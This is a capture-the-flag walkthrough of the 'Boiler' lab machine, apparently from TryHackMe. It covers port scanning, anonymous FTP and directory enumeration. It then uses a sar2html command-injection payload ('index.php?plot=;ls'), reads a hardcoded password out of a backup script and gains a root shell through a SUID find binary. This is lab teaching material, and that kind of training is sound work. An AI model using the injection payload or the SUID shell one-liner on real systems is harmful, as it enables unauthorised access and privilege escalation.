# Intermediate level CTF. Just enumerate, you'll get there.  

# Answer the questions below
```
nmap -sC -sV -Pn -vv -oN nmap_scan.txt 10.10.119.148
PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.95.210
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
10000/tcp open  http    syn-ack MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: EAD310BF925CF6F66D1525106F5289E6
Service Info: OS: Unix

```
# File extension after anon login  
ftp is open, we can access the ftp by loggin in as anonymous username
```
ftp 10.10.119.148
Connected to 10.10.119.148.
220 (vsFTPd 3.0.3)
Name (10.10.119.148:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
229 Entering Extended Passive Mode (|||43007|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
229 Entering Extended Passive Mode (|||48281|)
150 Opening BINARY mode data connection for .info.txt (74 bytes).
100% |**************************************************|    74       42.38 KiB/s    00:00 ETA
226 Transfer complete.
74 bytes received in 00:00 (0.18 KiB/s)
ftp> 
ftp> exit
221 Goodbye.

```

# What is on the highest port? 
add -p- to scan all ports, you can do this from the start of scan
```
nmap -sC -sV -p- -Pn -vv -oN nmap_scan.txt 10.10.119.148
```
55007

# What's running on port 10000?  
webmin

# Can you exploit the service running on that port? (yay/nay answer)  
nay

# What's CMS can you access?  
```
$ gobuster dir -u 10.10.119.148 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.119.148
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/index.html           (Status: 200) [Size: 11321]
/joomla               (Status: 301) [Size: 315] [--> http://10.10.119.148/joomla/]
/manual               (Status: 301) [Size: 315] [--> http://10.10.119.148/manual/]
/robots.txt           (Status: 200) [Size: 257]
/server-status        (Status: 403) [Size: 301]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
joomla

# Keep enumerating, you'll know when you find it.  
no answer needed
```
$ gobuster dir -u 10.10.119.148/joomla -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.119.148/joomla
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 304]
/.hta                 (Status: 403) [Size: 299]
/.htpasswd            (Status: 403) [Size: 304]
/_archive             (Status: 301) [Size: 324] [--> http://10.10.119.148/joomla/_archive/]
/_files               (Status: 301) [Size: 322] [--> http://10.10.119.148/joomla/_files/]
/_database            (Status: 301) [Size: 325] [--> http://10.10.119.148/joomla/_database/]
/_test                (Status: 301) [Size: 321] [--> http://10.10.119.148/joomla/_test/]
/~www                 (Status: 301) [Size: 320] [--> http://10.10.119.148/joomla/~www/]
/administrator        (Status: 301) [Size: 329] [--> http://10.10.119.148/joomla/administrator/]
/bin                  (Status: 301) [Size: 319] [--> http://10.10.119.148/joomla/bin/]
/build                (Status: 301) [Size: 321] [--> http://10.10.119.148/joomla/build/]
/cache                (Status: 301) [Size: 321] [--> http://10.10.119.148/joomla/cache/]
/components           (Status: 301) [Size: 326] [--> http://10.10.119.148/joomla/components/]
/images               (Status: 301) [Size: 322] [--> http://10.10.119.148/joomla/images/]
/includes             (Status: 301) [Size: 324] [--> http://10.10.119.148/joomla/includes/]
/index.php            (Status: 200) [Size: 12484]
/installation         (Status: 301) [Size: 328] [--> http://10.10.119.148/joomla/installation/]
/language             (Status: 301) [Size: 324] [--> http://10.10.119.148/joomla/language/]
/layouts              (Status: 301) [Size: 323] [--> http://10.10.119.148/joomla/layouts/]
/libraries            (Status: 301) [Size: 325] [--> http://10.10.119.148/joomla/libraries/]
/media                (Status: 301) [Size: 321] [--> http://10.10.119.148/joomla/media/]
/modules              (Status: 301) [Size: 323] [--> http://10.10.119.148/joomla/modules/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.119.148/joomla/plugins/]
/templates            (Status: 301) [Size: 325] [--> http://10.10.119.148/joomla/templates/]
/tests                (Status: 301) [Size: 321] [--> http://10.10.119.148/joomla/tests/]
/tmp                  (Status: 301) [Size: 319] [--> http://10.10.119.148/joomla/tmp/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
in `/joomla/_test` we have sar2html.
search exploit for sar2html https://www.exploit-db.com/exploits/47204
```txt
In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
```

The interesting file name in the folder?
```
http://10.10.119.148/joomla/_test/index.php?plot=;ls
```
![[Boiler.png]]

# Task 2
You can complete this with manual enumeration, but do it as you wish  

Answer the questions below

# Where was the other users pass stored(no extension, just the name)?  
```
$ ssh basterd@10.10.119.148 -p 55007
$ id
uid=1001(basterd) gid=1001(basterd) groups=1001(basterd)
$ ls
backup.sh
$ cat backup.sh 
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
```
backup

# user.txt
login as other user
```
$ su stoner
Password: 
stoner@Vulnerable:/home/basterd$ ls
ls: cannot open directory '.': Permission denied
stoner@Vulnerable:/home/basterd$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
stoner@Vulnerable:/home/basterd$ ls -la
ls: cannot open directory '.': Permission denied
stoner@Vulnerable:/home/basterd$ cd
stoner@Vulnerable:~$ ls -la
total 16
drwxr-x--- 3 stoner stoner 4096 Aug 22  2019 .
drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
stoner@Vulnerable:~$ cat .secret
You made it till here, well done.
```

What did you exploit to get the privileged user?  
```
stoner@Vulnerable:~$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
stoner@Vulnerable:~$ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
-rwsr-xr-x 1 root root 38900 Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 30112 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 26492 May 15  2019 /bin/umount
-rwsr-xr-x 1 root root 34812 May 15  2019 /bin/mount
-rwsr-xr-x 1 root root 43316 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 38932 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-custom
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-pristine
-rwsr-xr-- 1 root messagebus 46436 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newgidmap
-r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find
-rwsr-sr-x 1 daemon daemon 50748 Jan 15  2016 /usr/bin/at
-rwsr-xr-x 1 root root 39560 Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 74280 Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 53128 Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 34680 Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 159852 Jun 11  2019 /usr/bin/sudo
-rwsr-xr-x 1 root root 18216 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 78012 Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newuidmap
```
we can execute this command with root `-r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find
`
# root.txt
check exploits for find suid in https://gtfobins.github.io/gtfobins/find/
```
stoner@Vulnerable:/root$ find . -exec /bin/sh -p \; -quit
# ls
root.txt
# cat root.txt  
It wasn't that hard, was it?
```